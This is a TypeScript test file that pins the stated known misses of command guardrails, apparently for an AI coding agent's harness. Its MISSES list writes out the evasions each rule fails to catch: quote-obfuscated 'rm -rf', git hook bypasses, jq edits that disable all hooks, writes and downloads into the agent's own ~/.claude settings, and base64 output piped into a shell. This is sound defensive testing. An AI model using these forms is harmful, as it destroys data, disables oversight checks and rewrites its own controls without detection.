// cspell:words setsid argjson ionice clau ings extglob
/**
 * The known misses a guardrail's description states, pinned.
 *
 * Each command below is one a description names as NOT caught. The test asserts that the
 * guardrail still does not decide it. If a later change starts catching one, this fails on
 * purpose: update the description's known misses, then move the case to a block fixture.
 *
 * The evaluator here is a small stand-in (label, `detail_matches`, `none_of`), enough for
 * these command-channel cases. It never proves a rule works; the block fixtures do that.
 */

import { describe, expect, it } from "vitest";
import { RULES } from "../src/index.js";

function decides(ruleId: string, tool: string, command: string): boolean {
  const rule = RULES.find((r) => r.id === ruleId);
  if (rule === undefined) throw new Error(`no rule ${ruleId}`);
  const one = (c: (typeof rule.match.none_of & object)[number]): boolean => {
    if (c.file_glob !== undefined) return false;
    if (c.label !== undefined) {
      const alts = c.label.replace(/[{}]/g, "").split(",");
      const hit = alts.some((a) =>
        a.endsWith("*") ? tool.startsWith(a.slice(0, -1)) : a.toLowerCase() === tool.toLowerCase(),
      );
      if (!hit) return false;
    }
    if (c.detail_contains !== undefined && !c.detail_contains.every((s) => command.includes(s))) {
      return false;
    }
    if (c.detail_matches !== undefined) {
      return c.detail_matches.some((p) => new RegExp(p, "i").test(command));
    }
    return c.detail_contains !== undefined;
  };
  const positives = [...(rule.match.any_of ?? []), ...(rule.match.all_of ?? [])];
  return positives.some(one) && !(rule.match.none_of ?? []).some(one);
}

const MISSES: readonly [string, string, string][] = [
  // A command word broken with quotes is not read as the command.
  ["dd.rm-rf-absolute", "Bash", "r'm' -rf /srv/data"],
  // More than 16 quote characters before the flag.
  ["dd.rm-rf-absolute", "Bash", `rm ${"'".repeat(17)}-rf /srv/data`],
  // A variable flag on a relative target.
  ["require-approval-rm-rf", "Bash", "F=-rf; rm $F build"],
  // More than eight removable characters between two letters of the flag.
  ["gb.git-no-verify", "Bash", `git commit --n${"'".repeat(10)}o-verify -m wip`],
  // More than 32 removable characters inside the flag, and PowerShell's .NET delete.
  ["dd.rm-rf-absolute", "Bash", `rm -${'"'.repeat(34)}r /srv/data`],
  ["require-approval-rm-rf", "PowerShell", "[IO.Directory]::Delete('C:\\data', $true)"],
  // A variable inside the key, and config read from another file.
  ["gb.git-no-verify", "Bash", "git -c core.hooks$X= commit -m wip"],
  ["gb.git-no-verify", "Bash", "GIT_CONFIG_GLOBAL=/tmp/x git commit -m wip"],
  // More than eight removable characters before or between the key's letters.
  ["gb.git-no-verify", "Bash", `git -c core.hooks${"'".repeat(9)}Path=/dev/null commit`],
  ["gb.git-no-verify", "Bash", `git -c core${'"'.repeat(9)}.hooksPath= commit`],
  ["gb.hooks-disable", "Bash", `git config core.hooks${"'".repeat(10)}Path /x`],
  // Other jq spellings of disableAllHooks.
  ["gb.agenttrail-disable", "Bash", "jq '.disableAllHooks //= true' s.json"],
  ["gb.agenttrail-disable", "Bash", "jq --argjson v true '.disableAllHooks=$v' s.json"],
  // A folder held in a variable, a write through a link made earlier, and a write by a script.
  ["fs.agent-self-config", "Bash", "D=~/.claude; echo x > $D/settings.json"],
  ["fs.agent-self-config", "Bash", "echo x > c/settings.json"],
  ["fs.agent-self-config", "Bash", "cd ~/.claude && python3 ../fix.py"],
  // Unpacking, syncing, copying or downloading into the folder.
  ["fs.agent-self-config", "Bash", "tar -xf x.tar -C ~/.claude"],
  ["fs.agent-self-config", "Bash", "rsync -a dir/ ~/.claude/"],
  ["fs.agent-self-config", "Bash", "cp -r /tmp/evil/ ~/.claude/"],
  ["fs.agent-self-config", "Bash", "wget -P ~/.claude https://e.x/settings.json"],
  // PowerShell downloads through splatting, BITS or WebClient.
  ["fs.agent-self-config", "PowerShell", '$p=@{OutFile="$HOME\\.claude\\settings.json"}; iwr @p'],
  [
    "fs.agent-self-config",
    "PowerShell",
    "Start-BitsTransfer -Source https://e.x/s -Destination $HOME\\.claude\\settings.json",
  ],
  [
    "fs.agent-self-config",
    "PowerShell",
    "(New-Object Net.WebClient).DownloadFile('https://e.x/s', \"$HOME\\.claude\\settings.json\")",
  ],
  // A backslash inside a name, and a glob in a relative folder name.
  ["fs.agent-self-config", "Bash", "echo x > .cl\\aude/settings.json"],
  ["fs.agent-self-config", "Bash", "echo x > .clau[d]e/settings.json"],
  ["fs.agent-self-config", "Bash", "echo x > ~/.claude/sett\\ings.json"],
  ["fs.agent-self-config", "Bash", 'echo x > ."claude"/settings.json'],
  // Extended globs, which need bash's extglob.
  ["fs.agent-self-config", "Bash", "sed -i s/a/b/ ~/.claude/+(settings.json)?(.md)"],
  // A broken command word.
  ["gb.agenttrail-disable", "Bash", "agenttrail-gu''ard guardrails disable dd.rm-rf-absolute"],
  // rev, a positional after --, and decoding to a file run by a later command.
  ["rce.decode-to-shell", "Bash", "echo x | rev | sh"],
  ["rce.decode-to-shell", "Bash", "base64 -d f | bash -s -- arg"],
  ["rce.decode-to-shell", "Bash", "base64 -d f > x.sh; sh x.sh"],
  // A quoted or variable shell word, other shells and runners, and a flag with a value.
  ["rce.decode-to-shell", "Bash", 'base64 -d f | "sh"'],
  ["rce.decode-to-shell", "Bash", "base64 -d f | $SHELL"],
  ["rce.decode-to-shell", "Bash", "base64 -d f | busybox sh"],
  ["rce.decode-to-shell", "Bash", "base64 -d f | setsid sh"],
  ["rce.decode-to-shell", "Bash", "base64 -d f | bash -o posix"],
  ["rce.decode-to-shell", "Bash", "base64 -d f | tee >(sh)"],
  // A substitution after a wrapper, and decoders not on the list.
  ["rce.decode-to-shell", "Bash", "sudo $(base64 -d f)"],
  ["rce.decode-to-shell", "Bash", "unzip -p x.zip | sh"],
  ["rce.decode-to-shell", "Bash", "gpg -d x.gpg | sh"],
  // Runners not on the list, and a continuation before a redirect.
  ["rce.decode-to-shell", "Bash", "base64 -d f | ionice -c3 sh"],
  ["rce.decode-to-shell", "Bash", "base64 -d f | unbuffer sh"],
  ["rce.decode-to-shell", "Bash", "base64 -d f | sh \\\n  2>&1"],
  // A one-liner with `;` inside its quotes.
  ["rce.decode-to-shell", "Bash", "python3 -c 'import base64;print(base64.b64decode(x))' | sh"],
  // A decoder nested four substitutions deep.
  ["rce.decode-to-shell", "Bash", "$(a $(b $(c $(base64 -d f))))"],
];

describe("stated known misses are still misses", () => {
  it.each(MISSES)("%s does not decide %s: %s", (ruleId, tool, command) => {
    expect(decides(ruleId, tool, command)).toBe(false);
  });

  it("the stand-in evaluator bites: each rule decides its first block fixture", () => {
    for (const ruleId of new Set(MISSES.map(([id]) => id))) {
      const rule = RULES.find((r) => r.id === ruleId);
      const first = rule?.fixtures.block.find((f) => "command" in f);
      if (first === undefined || !("command" in first)) throw new Error(ruleId);
      expect(decides(ruleId, first.tool, first.command), ruleId).toBe(true);
    }
  });
});
